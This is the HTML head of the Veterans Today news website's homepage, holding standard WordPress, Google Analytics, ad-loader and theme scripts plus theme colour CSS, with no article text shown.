<!doctype html >
<!--[if IE 8]>    <html class="ie8" lang="en"> <![endif]-->
<!--[if IE 9]>    <html class="ie9" lang="en"> <![endif]-->
<!--[if gt IE 8]><!--> <html lang="en-US" xmlns:fb="http://www.facebook.com/2008/fbml" xmlns:og="http://opengraphprotocol.org/schema/"> <!--<![endif]-->
<head><script>var googletag = googletag || {};googletag.cmd = googletag.cmd || [];  var optimalmedia = optimalmedia || {};optimalmedia.que = optimalmedia.que || [];</script><script src="https://pub.optimalmedia.io/pub/veteranstoday/pb.js" async="true" data-cfasync="false"></script></head>
<title>Veterans Today | News &#8211; Military Foreign Affairs &#8211; VA</title>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="pingback" href="https://www.veteranstoday.com/xmlrpc.php" />
<link rel="icon" type="image/png" href="https://www.veteranstoday.com/wp-content/uploads/2017/10/vt16X16.png"><link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://www.veteranstoday.com/wp-content/uploads/2017/10/76x76.png" /><link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://www.veteranstoday.com/wp-content/uploads/2017/10/120x120.png" /><link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://www.veteranstoday.com/wp-content/uploads/2017/10/152x152.png" /><link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://www.veteranstoday.com/wp-content/uploads/2017/10/114x114.png" /><link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.veteranstoday.com/wp-content/uploads/2017/10/144x144.png" /><link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Veterans Today &raquo; Feed" href="https://www.veteranstoday.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Veterans Today &raquo; Comments Feed" href="https://www.veteranstoday.com/comments/feed/" />

<script type="text/javascript" data-cfasync="false">
	var mi_track_user = true;
	var disableStr = 'ga-disable-UA-4342133-17';

	/* Function to detect opted out users */
	function __gaTrackerIsOptedOut() {
		return document.cookie.indexOf(disableStr + '=true') > -1;
	}

	/* Disable tracking if the opt-out cookie exists. */
	if ( __gaTrackerIsOptedOut() ) {
		window[disableStr] = true;
	}

	/* Opt-out function */
	function __gaTrackerOptout() {
	  document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
	  window[disableStr] = true;
	}
	
	if ( mi_track_user ) {
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');

		__gaTracker('create', 'UA-4342133-17', 'auto');
		__gaTracker('set', 'forceSSL', true);
		__gaTracker('require', 'displayfeatures');
		__gaTracker('send','pageview');
	} else {
		console.log( "" );
		(function() {
			/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
			var noopfn = function() {
				return null;
			};
			var noopnullfn = function() {
				return null;
			};
			var Tracker = function() {
				return null;
			};
			var p = Tracker.prototype;
			p.get = noopfn;
			p.set = noopfn;
			p.send = noopfn;
			var __gaTracker = function() {
				var len = arguments.length;
				if ( len === 0 ) {
					return;
				}
				var f = arguments[len-1];
				if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
					console.log( 'Not running function __gaTracker(' + arguments[0] + " ....) because you\'re not being tracked. ");
					return;
				}
				try {
					f.hitCallback();
				} catch (ex) {

				}
			};
			__gaTracker.create = function() {
				return new Tracker();
			};
			__gaTracker.getByName = noopnullfn;
			__gaTracker.getAll = function() {
				return [];
			};
			__gaTracker.remove = noopfn;
			window['__gaTracker'] = __gaTracker;
		})();
		}
</script>

<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.veteranstoday.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56692,8205,9792,65039],[55357,56692,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
<script>
					advanced_ads_ready=function(){var fns=[],listener,doc=typeof document==="object"&&document,hack=doc&&doc.documentElement.doScroll,domContentLoaded="DOMContentLoaded",loaded=doc&&(hack?/^loaded|^c/:/^loaded|^i|^c/).test(doc.readyState);if(!loaded&&doc){listener=function(){doc.removeEventListener(domContentLoaded,listener);window.removeEventListener("load",listener);loaded=1;while(listener=fns.shift())listener()};doc.addEventListener(domContentLoaded,listener);window.addEventListener("load",listener)}return function(fn){loaded?setTimeout(fn,0):fns.push(fn)}}();
			</script><style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='fbc_rc_widgets-style-css' href='https://www.veteranstoday.com/wp-content/plugins/facebook-comments-for-wordpress/css/facebook-comments-widgets.css?ver=4.9.4' type='text/css' media='all' />
<link rel='stylesheet' id='bbp-default-css' href='https://www.veteranstoday.com/wp-content/plugins/bbpress/templates/default/css/bbpress.css?ver=2.5.14-6684' type='text/css' media='screen' />
<link rel='stylesheet' id='ctct_form_styles-css' href='https://www.veteranstoday.com/wp-content/plugins/constant-contact-forms/assets/css/style.css?ver=1.3.6' type='text/css' media='all' />
<link rel='stylesheet' id='wp-polls-css' href='https://www.veteranstoday.com/wp-content/plugins/wp-polls/polls-css.css?ver=2.73.8' type='text/css' media='all' />
<style id='wp-polls-inline-css' type='text/css'>
.wp-polls .pollbar {
	margin: 1px;
	font-size: 6px;
	line-height: 8px;
	height: 8px;
	background-image: url('https://www.veteranstoday.com/wp-content/plugins/wp-polls/images/default/pollbg.gif');
	border: 1px solid #c8c8c8;
}

</style>
<link rel='stylesheet' id='google-fonts-style-css' href='https://fonts.googleapis.com/css?family=Open+Sans%3A300italic%2C400%2C400italic%2C600%2C600italic%2C700%7CRoboto%3A300%2C400%2C400italic%2C500%2C500italic%2C700%2C900&#038;ver=8.6' type='text/css' media='all' />
<link rel='stylesheet' id='tablepress-default-css' href='https://www.veteranstoday.com/wp-content/plugins/tablepress/css/default.min.css?ver=1.9' type='text/css' media='all' />
<link rel='stylesheet' id='js_composer_front-css' href='https://www.veteranstoday.com/wp-content/plugins/js_composer/assets/css/js_composer.min.css?ver=5.4.5' type='text/css' media='all' />
<link rel='stylesheet' id='td-theme-css' href='https://www.veteranstoday.com/wp-content/themes/Newspaper/style.css?ver=8.6' type='text/css' media='all' />
<link rel='stylesheet' id='td-theme-child-css' href='https://www.veteranstoday.com/wp-content/themes/Newspaper-child/style.css?ver=8.6c' type='text/css' media='all' />
<link rel='stylesheet' id='td-theme-bbpress-css' href='https://www.veteranstoday.com/wp-content/themes/Newspaper/style-bbpress.css?ver=8.6' type='text/css' media='all' />
<script type='text/javascript' src='https://www.veteranstoday.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
<script type='text/javascript' src='https://www.veteranstoday.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var monsterinsights_frontend = {"js_events_tracking":"true","is_debug_mode":"false","download_extensions":"doc,exe,js,pdf,ppt,tgz,zip,xls","inbound_paths":"","home_url":"https:\/\/www.veteranstoday.com","track_download_as":"event","internal_label":"int","hash_tracking":"false"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.veteranstoday.com/wp-content/plugins/google-analytics-for-wordpress/assets/js/frontend.min.js?ver=7.0.4'></script>
<script type='text/javascript' src='https://www.veteranstoday.com/wp-content/plugins/vin-wp-comment-limits/vin-wp-comment-limits.js?ver=1.0'></script>
<link rel='https://api.w.org/' href='https://www.veteranstoday.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.veteranstoday.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.veteranstoday.com/wp-includes/wlwmanifest.xml" />
<meta name="generator" content="WordPress 4.9.4" />
<link rel="canonical" href="https://www.veteranstoday.com/" />
<link rel='shortlink' href='https://www.veteranstoday.com/' />
<link rel="alternate" type="application/json+oembed" href="https://www.veteranstoday.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.veteranstoday.com%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://www.veteranstoday.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.veteranstoday.com%2F&#038;format=xml" />
<meta property='og:title' content='Home' /><meta property='og:site_name' content='Veterans Today' /><meta property='og:url' content='https://www.veteranstoday.com/' /><meta property='og:type' content='article' /><meta property='fb:app_id' content='186129858162243'>
<meta property="fb:pages" content="170917822620" />
<script type="text/javascript"><!--
function powerpress_pinw(pinw_url){window.open(pinw_url, 'PowerPressPlayer','toolbar=0,status=0,resizable=1,width=460,height=320');	return false;}
//-->
</script>
<!--[if lt IE 9]><script src="https://html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
<meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress." />
<!--[if lte IE 9]><link rel="stylesheet" type="text/css" href="https://www.veteranstoday.com/wp-content/plugins/js_composer/assets/css/vc_lte_ie9.min.css" media="screen"><![endif]-->

<script>
    
    

	    var tdBlocksArray = []; //here we store all the items for the current page

	    //td_block class - each ajax block uses a object of this class for requests
	    function tdBlock() {
		    this.id = '';
		    this.block_type = 1; //block type id (1-234 etc)
		    this.atts = '';
		    this.td_column_number = '';
		    this.td_current_page = 1; //
		    this.post_count = 0; //from wp
		    this.found_posts = 0; //from wp
		    this.max_num_pages = 0; //from wp
		    this.td_filter_value = ''; //current live filter value
		    this.is_ajax_running = false;
		    this.td_user_action = ''; // load more or infinite loader (used by the animation)
		    this.header_color = '';
		    this.ajax_pagination_infinite_stop = ''; //show load more at page x
	    }


        // td_js_generator - mini detector
        (function(){
            var htmlTag = document.getElementsByTagName("html")[0];

	        if ( navigator.userAgent.indexOf("MSIE 10.0") > -1 ) {
                htmlTag.className += ' ie10';
            }

            if ( !!navigator.userAgent.match(/Trident.*rv\:11\./) ) {
                htmlTag.className += ' ie11';
            }

	        if ( navigator.userAgent.indexOf("Edge") > -1 ) {
                htmlTag.className += ' ieEdge';
            }

            if ( /(iPad|iPhone|iPod)/g.test(navigator.userAgent) ) {
                htmlTag.className += ' td-md-is-ios';
            }

            var user_agent = navigator.userAgent.toLowerCase();
            if ( user_agent.indexOf("android") > -1 ) {
                htmlTag.className += ' td-md-is-android';
            }

            if ( -1 !== navigator.userAgent.indexOf('Mac OS X')  ) {
                htmlTag.className += ' td-md-is-os-x';
            }

            if ( /chrom(e|ium)/.test(navigator.userAgent.toLowerCase()) ) {
               htmlTag.className += ' td-md-is-chrome';
            }

            if ( -1 !== navigator.userAgent.indexOf('Firefox') ) {
                htmlTag.className += ' td-md-is-firefox';
            }

            if ( -1 !== navigator.userAgent.indexOf('Safari') && -1 === navigator.userAgent.indexOf('Chrome') ) {
                htmlTag.className += ' td-md-is-safari';
            }

            if( -1 !== navigator.userAgent.indexOf('IEMobile') ){
                htmlTag.className += ' td-md-is-iemobile';
            }

        })();




        var tdLocalCache = {};

        ( function () {
            "use strict";

            tdLocalCache = {
                data: {},
                remove: function (resource_id) {
                    delete tdLocalCache.data[resource_id];
                },
                exist: function (resource_id) {
                    return tdLocalCache.data.hasOwnProperty(resource_id) && tdLocalCache.data[resource_id] !== null;
                },
                get: function (resource_id) {
                    return tdLocalCache.data[resource_id];
                },
                set: function (resource_id, cachedData) {
                    tdLocalCache.remove(resource_id);
                    tdLocalCache.data[resource_id] = cachedData;
                }
            };
        })();

    
    
var tds_login_sing_in_widget="show";
var td_viewport_interval_list=[{"limitBottom":767,"sidebarWidth":228},{"limitBottom":1018,"sidebarWidth":300},{"limitBottom":1140,"sidebarWidth":324}];
var td_animation_stack_effect="type0";
var tds_animation_stack=true;
var td_animation_stack_specific_selectors=".entry-thumb, img";
var td_animation_stack_general_selectors=".td-animation-stack img, .td-animation-stack .entry-thumb, .post img";
var td_ajax_url="https:\/\/www.veteranstoday.com\/wp-admin\/admin-ajax.php?td_theme_name=Newspaper&v=8.6";
var td_get_template_directory_uri="https:\/\/www.veteranstoday.com\/wp-content\/themes\/Newspaper";
var tds_snap_menu="smart_snap_always";
var tds_logo_on_sticky="show_header_logo";
var tds_header_style="";
var td_please_wait="Please wait...";
var td_email_user_pass_incorrect="User or password incorrect!";
var td_email_user_incorrect="Email or username incorrect!";
var td_email_incorrect="Email incorrect!";
var tds_more_articles_on_post_enable="";
var tds_more_articles_on_post_time_to_wait="3";
var tds_more_articles_on_post_pages_distance_from_top=0;
var tds_theme_color_site_wide="#990000";
var tds_smart_sidebar="enabled";
var tdThemeName="Newspaper";
var td_magnific_popup_translation_tPrev="Previous (Left arrow key)";
var td_magnific_popup_translation_tNext="Next (Right arrow key)";
var td_magnific_popup_translation_tCounter="%curr% of %total%";
var td_magnific_popup_translation_ajax_tError="The content from %url% could not be loaded.";
var td_magnific_popup_translation_image_tError="The image #%curr% could not be loaded.";
var tdsDateFormat="l, F j, Y";
var tdDateNamesI18n={"month_names":["January","February","March","April","May","June","July","August","September","October","November","December"],"month_names_short":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"day_names":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"day_names_short":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"]};
var td_ad_background_click_link="";
var td_ad_background_click_target="";
</script>

<style>
    
.td-header-wrap .black-menu .sf-menu > .current-menu-item > a,
    .td-header-wrap .black-menu .sf-menu > .current-menu-ancestor > a,
    .td-header-wrap .black-menu .sf-menu > .current-category-ancestor > a,
    .td-header-wrap .black-menu .sf-menu > li > a:hover,
    .td-header-wrap .black-menu .sf-menu > .sfHover > a,
    .td-header-style-12 .td-header-menu-wrap-full,
    .sf-menu > .current-menu-item > a:after,
    .sf-menu > .current-menu-ancestor > a:after,
    .sf-menu > .current-category-ancestor > a:after,
    .sf-menu > li:hover > a:after,
    .sf-menu > .sfHover > a:after,
    .td-header-style-12 .td-affix,
    .header-search-wrap .td-drop-down-search:after,
    .header-search-wrap .td-drop-down-search .btn:hover,
    input[type=submit]:hover,
    .td-read-more a,
    .td-post-category:hover,
    .td-grid-style-1.td-hover-1 .td-big-grid-post:hover .td-post-category,
    .td-grid-style-5.td-hover-1 .td-big-grid-post:hover .td-post-category,
    .td_top_authors .td-active .td-author-post-count,
    .td_top_authors .td-active .td-author-comments-count,
    .td_top_authors .td_mod_wrap:hover .td-author-post-count,
    .td_top_authors .td_mod_wrap:hover .td-author-comments-count,
    .td-404-sub-sub-title a:hover,
    .td-search-form-widget .wpb_button:hover,
    .td-rating-bar-wrap div,
    .td_category_template_3 .td-current-sub-category,
    .dropcap,
    .td_wrapper_video_playlist .td_video_controls_playlist_wrapper,
    .wpb_default,
    .wpb_default:hover,
    .td-left-smart-list:hover,
    .td-right-smart-list:hover,
    .woocommerce-checkout .woocommerce input.button:hover,
    .woocommerce-page .woocommerce a.button:hover,
    .woocommerce-account div.woocommerce .button:hover,
    #bbpress-forums button:hover,
    .bbp_widget_login .button:hover,
    .td-footer-wrapper .td-post-category,
    .td-footer-wrapper .widget_product_search input[type="submit"]:hover,
    .woocommerce .product a.button:hover,
    .woocommerce .product #respond input#submit:hover,
    .woocommerce .checkout input#place_order:hover,
    .woocommerce .woocommerce.widget .button:hover,
    .single-product .product .summary .cart .button:hover,
    .woocommerce-cart .woocommerce table.cart .button:hover,
    .woocommerce-cart .woocommerce .shipping-calculator-form .button:hover,
    .td-next-prev-wrap a:hover,
    .td-load-more-wrap a:hover,
    .td-post-small-box a:hover,
    .page-nav .current,
    .page-nav:first-child > div,
    .td_category_template_8 .td-category-header .td-category a.td-current-sub-category,
    .td_category_template_4 .td-category-siblings .td-category a:hover,
    #bbpress-forums .bbp-pagination .current,
    #bbpress-forums #bbp-single-user-details #bbp-user-navigation li.current a,
    .td-theme-slider:hover .slide-meta-cat a,
    a.vc_btn-black:hover,
    .td-trending-now-wrapper:hover .td-trending-now-title,
    .td-scroll-up,
    .td-smart-list-button:hover,
    .td-weather-information:before,
    .td-weather-week:before,
    .td_block_exchange .td-exchange-header:before,
    .td_block_big_grid_9.td-grid-style-1 .td-post-category,
    .td_block_big_grid_9.td-grid-style-5 .td-post-category,
    .td-grid-style-6.td-hover-1 .td-module-thumb:after,
    .td-pulldown-syle-2 .td-subcat-dropdown ul:after,
    .td_block_template_9 .td-block-title:after,
    .td_block_template_15 .td-block-title:before,
    div.wpforms-container .wpforms-form div.wpforms-submit-container button[type=submit] {
        background-color: #990000;
    }

    .global-block-template-4 .td-related-title .td-cur-simple-item:before {
        border-color: #990000 transparent transparent transparent !important;
    }

    .woocommerce .woocommerce-message .button:hover,
    .woocommerce .woocommerce-error .button:hover,
    .woocommerce .woocommerce-info .button:hover,
    .global-block-template-4 .td-related-title .td-cur-simple-item,
    .global-block-template-3 .td-related-title .td-cur-simple-item,
    .global-block-template-9 .td-related-title:after {
        background-color: #990000 !important;
    }

    .woocommerce .product .onsale,
    .woocommerce.widget .ui-slider .ui-slider-handle {
        background: none #990000;
    }

    .woocommerce.widget.widget_layered_nav_filters ul li a {
        background: none repeat scroll 0 0 #990000 !important;
    }

    a,
    cite a:hover,
    .td_mega_menu_sub_cats .cur-sub-cat,
    .td-mega-span h3 a:hover,
    .td_mod_mega_menu:hover .entry-title a,
    .header-search-wrap .result-msg a:hover,
    .td-header-top-menu .td-drop-down-search .td_module_wrap:hover .entry-title a,
    .td-header-top-menu .td-icon-search:hover,
    .td-header-wrap .result-msg a:hover,
    .top-header-menu li a:hover,
    .top-header-menu .current-menu-item > a,
    .top-header-menu .current-menu-ancestor > a,
    .top-header-menu .current-category-ancestor > a,
    .td-social-icon-wrap > a:hover,
    .td-header-sp-top-widget .td-social-icon-wrap a:hover,
    .td-page-content blockquote p,
    .td-post-content blockquote p,
    .mce-content-body blockquote p,
    .comment-content blockquote p,
    .wpb_text_column blockquote p,
    .td_block_text_with_title blockquote p,
    .td_module_wrap:hover .entry-title a,
    .td-subcat-filter .td-subcat-list a:hover,
    .td-subcat-filter .td-subcat-dropdown a:hover,
    .td_quote_on_blocks,
    .dropcap2,
    .dropcap3,
    .td_top_authors .td-active .td-authors-name a,
    .td_top_authors .td_mod_wrap:hover .td-authors-name a,
    .td-post-next-prev-content a:hover,
    .author-box-wrap .td-author-social a:hover,
    .td-author-name a:hover,
    .td-author-url a:hover,
    .td_mod_related_posts:hover h3 > a,
    .td-post-template-11 .td-related-title .td-related-left:hover,
    .td-post-template-11 .td-related-title .td-related-right:hover,
    .td-post-template-11 .td-related-title .td-cur-simple-item,
    .td-post-template-11 .td_block_related_posts .td-next-prev-wrap a:hover,
    .comment-reply-link:hover,
    .logged-in-as a:hover,
    #cancel-comment-reply-link:hover,
    .td-search-query,
    .td-category-header .td-pulldown-category-filter-link:hover,
    .td-category-siblings .td-subcat-dropdown a:hover,
    .td-category-siblings .td-subcat-dropdown a.td-current-sub-category,
    .widget a:hover,
    .td_wp_recentcomments a:hover,
    .archive .widget_archive .current,
    .archive .widget_archive .current a,
    .widget_calendar tfoot a:hover,
    .woocommerce a.added_to_cart:hover,
    .woocommerce-account .woocommerce-MyAccount-navigation a:hover,
    #bbpress-forums li.bbp-header .bbp-reply-content span a:hover,
    #bbpress-forums .bbp-forum-freshness a:hover,
    #bbpress-forums .bbp-topic-freshness a:hover,
    #bbpress-forums .bbp-forums-list li a:hover,
    #bbpress-forums .bbp-forum-title:hover,
    #bbpress-forums .bbp-topic-permalink:hover,
    #bbpress-forums .bbp-topic-started-by a:hover,
    #bbpress-forums .bbp-topic-started-in a:hover,
    #bbpress-forums .bbp-body .super-sticky li.bbp-topic-title .bbp-topic-permalink,
    #bbpress-forums .bbp-body .sticky li.bbp-topic-title .bbp-topic-permalink,
    .widget_display_replies .bbp-author-name,
    .widget_display_topics .bbp-author-name,
    .footer-text-wrap .footer-email-wrap a,
    .td-subfooter-menu li a:hover,
    .footer-social-wrap a:hover,
    a.vc_btn-black:hover,
    .td-smart-list-dropdown-wrap .td-smart-list-button:hover,
    .td_module_17 .td-read-more a:hover,
    .td_module_18 .td-read-more a:hover,
    .td_module_19 .td-post-author-name a:hover,
    .td-instagram-user a,
    .td-pulldown-syle-2 .td-subcat-dropdown:hover .td-subcat-more span,
    .td-pulldown-syle-2 .td-subcat-dropdown:hover .td-subcat-more i,
    .td-pulldown-syle-3 .td-subcat-dropdown:hover .td-subcat-more span,
    .td-pulldown-syle-3 .td-subcat-dropdown:hover .td-subcat-more i,
    .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-display-option:hover,
    .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-display-option:hover i,
    .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-link:hover,
    .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-item .td-cur-simple-item,
    .global-block-template-2 .td-related-title .td-cur-simple-item,
    .global-block-template-5 .td-related-title .td-cur-simple-item,
    .global-block-template-6 .td-related-title .td-cur-simple-item,
    .global-block-template-7 .td-related-title .td-cur-simple-item,
    .global-block-template-8 .td-related-title .td-cur-simple-item,
    .global-block-template-9 .td-related-title .td-cur-simple-item,
    .global-block-template-10 .td-related-title .td-cur-simple-item,
    .global-block-template-11 .td-related-title .td-cur-simple-item,
    .global-block-template-12 .td-related-title .td-cur-simple-item,
    .global-block-template-13 .td-related-title .td-cur-simple-item,
    .global-block-template-14 .td-related-title .td-cur-simple-item,
    .global-block-template-15 .td-related-title .td-cur-simple-item,
    .global-block-template-16 .td-related-title .td-cur-simple-item,
    .global-block-template-17 .td-related-title .td-cur-simple-item,
    .td-theme-wrap .sf-menu ul .td-menu-item > a:hover,
    .td-theme-wrap .sf-menu ul .sfHover > a,
    .td-theme-wrap .sf-menu ul .current-menu-ancestor > a,
    .td-theme-wrap .sf-menu ul .current-category-ancestor > a,
    .td-theme-wrap .sf-menu ul .current-menu-item > a,
    .td_outlined_btn {
        color: #990000;
    }

    a.vc_btn-black.vc_btn_square_outlined:hover,
    a.vc_btn-black.vc_btn_outlined:hover,
    .td-mega-menu-page .wpb_content_element ul li a:hover,
    .td-theme-wrap .td-aj-search-results .td_module_wrap:hover .entry-title a,
    .td-theme-wrap .header-search-wrap .result-msg a:hover {
        color: #990000 !important;
    }

    .td-next-prev-wrap a:hover,
    .td-load-more-wrap a:hover,
    .td-post-small-box a:hover,
    .page-nav .current,
    .page-nav:first-child > div,
    .td_category_template_8 .td-category-header .td-category a.td-current-sub-category,
    .td_category_template_4 .td-category-siblings .td-category a:hover,
    #bbpress-forums .bbp-pagination .current,
    .post .td_quote_box,
    .page .td_quote_box,
    a.vc_btn-black:hover,
    .td_block_template_5 .td-block-title > *,
    .td_outlined_btn {
        border-color: #990000;
    }

    .td_wrapper_video_playlist .td_video_currently_playing:after {
        border-color: #990000 !important;
    }

    .header-search-wrap .td-drop-down-search:before {
        border-color: transparent transparent #990000 transparent;
    }

    .block-title > span,
    .block-title > a,
    .block-title > label,
    .widgettitle,
    .widgettitle:after,
    .td-trending-now-title,
    .td-trending-now-wrapper:hover .td-trending-now-title,
    .wpb_tabs li.ui-tabs-active a,
    .wpb_tabs li:hover a,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab.vc_active > a,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab:hover > a,
    .td_block_template_1 .td-related-title .td-cur-simple-item,
    .woocommerce .product .products h2:not(.woocommerce-loop-product__title),
    .td-subcat-filter .td-subcat-dropdown:hover .td-subcat-more, 
    .td_3D_btn,
    .td_shadow_btn,
    .td_default_btn,
    .td_round_btn, 
    .td_outlined_btn:hover {
    	background-color: #990000;
    }

    .woocommerce div.product .woocommerce-tabs ul.tabs li.active {
    	background-color: #990000 !important;
    }

    .block-title,
    .td_block_template_1 .td-related-title,
    .wpb_tabs .wpb_tabs_nav,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container,
    .woocommerce div.product .woocommerce-tabs ul.tabs:before {
        border-color: #990000;
    }
    .td_block_wrap .td-subcat-item a.td-cur-simple-item {
	    color: #990000;
	}


    
    .td-grid-style-4 .entry-title
    {
        background-color: rgba(153, 0, 0, 0.7);
    }

    
    .block-title > span,
    .block-title > span > a,
    .block-title > a,
    .block-title > label,
    .widgettitle,
    .widgettitle:after,
    .td-trending-now-title,
    .td-trending-now-wrapper:hover .td-trending-now-title,
    .wpb_tabs li.ui-tabs-active a,
    .wpb_tabs li:hover a,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab.vc_active > a,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab:hover > a,
    .td_block_template_1 .td-related-title .td-cur-simple-item,
    .woocommerce .product .products h2:not(.woocommerce-loop-product__title),
    .td-subcat-filter .td-subcat-dropdown:hover .td-subcat-more,
    .td-weather-information:before,
    .td-weather-week:before,
    .td_block_exchange .td-exchange-header:before,
    .td-theme-wrap .td_block_template_3 .td-block-title > *,
    .td-theme-wrap .td_block_template_4 .td-block-title > *,
    .td-theme-wrap .td_block_template_7 .td-block-title > *,
    .td-theme-wrap .td_block_template_9 .td-block-title:after,
    .td-theme-wrap .td_block_template_10 .td-block-title::before,
    .td-theme-wrap .td_block_template_11 .td-block-title::before,
    .td-theme-wrap .td_block_template_11 .td-block-title::after,
    .td-theme-wrap .td_block_template_14 .td-block-title,
    .td-theme-wrap .td_block_template_15 .td-block-title:before,
    .td-theme-wrap .td_block_template_17 .td-block-title:before {
        background-color: #222222;
    }

    .woocommerce div.product .woocommerce-tabs ul.tabs li.active {
    	background-color: #222222 !important;
    }

    .block-title,
    .td_block_template_1 .td-related-title,
    .wpb_tabs .wpb_tabs_nav,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container,
    .woocommerce div.product .woocommerce-tabs ul.tabs:before,
    .td-theme-wrap .td_block_template_5 .td-block-title > *,
    .td-theme-wrap .td_block_template_17 .td-block-title,
    .td-theme-wrap .td_block_template_17 .td-block-title::before {
        border-color: #222222;
    }

    .td-theme-wrap .td_block_template_4 .td-block-title > *:before,
    .td-theme-wrap .td_block_template_17 .td-block-title::after {
        border-color: #222222 transparent transparent transparent;
    }

    
    .td-theme-wrap .sf-menu .td-normal-menu .td-menu-item > a:hover,
    .td-theme-wrap .sf-menu .td-normal-menu .sfHover > a,
    .td-theme-wrap .sf-menu .td-normal-menu .current-menu-ancestor > a,
    .td-theme-wrap .sf-menu .td-normal-menu .current-category-ancestor > a,
    .td-theme-wrap .sf-menu .td-normal-menu .current-menu-item > a {
        color: #990000;
    }

    
    .td-theme-wrap .td_mod_mega_menu:hover .entry-title a,
    .td-theme-wrap .sf-menu .td_mega_menu_sub_cats .cur-sub-cat {
        color: #990000;
    }
    .td-theme-wrap .sf-menu .td-mega-menu .td-post-category:hover,
    .td-theme-wrap .td-mega-menu .td-next-prev-wrap a:hover {
        background-color: #990000;
    }
    .td-theme-wrap .td-mega-menu .td-next-prev-wrap a:hover {
        border-color: #990000;
    }

    
    .td-theme-wrap .header-search-wrap .td-drop-down-search .btn:hover {
        background-color: #990000;
    }
